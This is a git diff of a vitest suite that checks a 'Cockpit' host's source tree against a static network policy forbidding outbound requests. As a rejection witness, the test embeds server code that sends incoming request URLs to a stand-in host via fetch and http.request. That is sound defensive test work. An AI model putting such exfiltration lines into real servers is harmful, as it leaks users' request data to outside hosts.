@@ -15,6 +15,8 @@ import { fileURLToPath, pathToFileURL } from 'node:url';
 import ts from 'typescript';
 import { afterAll, describe, expect, it } from 'vitest';
 
+import { analyzeNetworkPolicy } from './support/d3-network-policy.js';
+
 /**
  * Cockpit D3 host purity, bounded to `src/cockpit-host/`.
  *
@@ -3359,5 +3361,64 @@ describe('D3 host rejects symlink escapes under the Cockpit boundary (D3-CX-POLI
     // fails closed on a Cockpit-boundary symlink exactly as it does on a host one.
     expect(() => hostSources()).not.toThrow();
     expect(hostSources().length).toBeGreaterThan(0);
+  });
+});
+
+/**
+ * D3 network policy (D3-NET, clean Stage-A model).
+ *
+ * The frozen single-file network policy lives in
+ * `./support/d3-network-policy.ts` and is exercised mechanism-by-mechanism in
+ * `d3-network-policy.test.ts` together with the semantic regression matrix.
+ * Here it is applied to the real host tree through the same symlink-checked
+ * `hostSources()` reader the other host guards use. The host may create exactly
+ * one inbound `node:http` server; it may not obtain outbound network, socket,
+ * hidden mutable server, or non-allow-listed request/response authority.
+ */
+describe('D3 host network policy (D3-NET)', () => {
+  it('accepts every real host source under the frozen network policy', () => {
+    for (const { file, text } of hostSources()) {
+      const result = analyzeNetworkPolicy(text);
+      const detail = result.findings
+        .map((finding) => `${finding.reason}@${String(finding.line)}:${String(finding.column)} ${finding.text}`)
+        .join('; ');
+      expect(result.fixpoint.state, `${file}: fixpoint ${result.fixpoint.state}`).toBe('CONVERGED');
+      expect(result.reasons, `${file}: ${detail}`).toEqual([]);
+      expect(result.verdict, file).toBe('ALLOW');
+    }
+  });
+
+  it('rejects a host that reaches outbound network or leaks server authority (witness)', () => {
+    const witness = `
+import http from 'node:http';
+import { request as httpRequest } from 'node:http';
+
+function handle(request: http.IncomingMessage, response: http.ServerResponse): void {
+  void fetch('https://exfil.example/' + (request.url ?? ''));
+  const { socket } = request;
+  socket.write('raw');
+  httpRequest('http://exfil.example/').end();
+  response.statusCode = 200;
+  response.end('ok');
+}
+
+export function createCockpitServer(): http.Server {
+  return http.createServer(handle);
+}
+
+const server = createCockpitServer();
+export { server };
+export const spare = http.createServer({ keepAlive: true }, handle);
+server.listen(4317, '127.0.0.1');
+`;
+    const result = analyzeNetworkPolicy(witness);
+    expect(result.verdict).toBe('DENY');
+    expect(result.reasons).toEqual([
+      'CREATE_SERVER_ARITY',
+      'FREE_GLOBAL_NETWORK',
+      'HTTP_CLIENT_CAPABILITY',
+      'REQUEST_DESTRUCTURING',
+      'SERVER_EXPORT',
+    ]);
   });
 });
